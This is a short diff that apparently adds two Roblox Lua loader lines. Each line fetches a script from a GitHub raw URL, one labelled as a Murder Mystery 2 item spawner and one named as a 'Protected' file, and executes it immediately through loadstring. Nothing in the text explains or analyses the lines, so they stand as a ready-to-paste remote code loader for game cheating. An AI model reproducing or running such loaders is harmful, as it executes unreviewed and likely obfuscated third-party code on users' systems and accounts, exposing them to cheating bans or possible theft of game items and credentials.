@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SILENTGORE/itemspawner/refs/heads/main/mm2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/Script/main/Protected_1ca0a795f842ebab7ae327ea.lua"))()
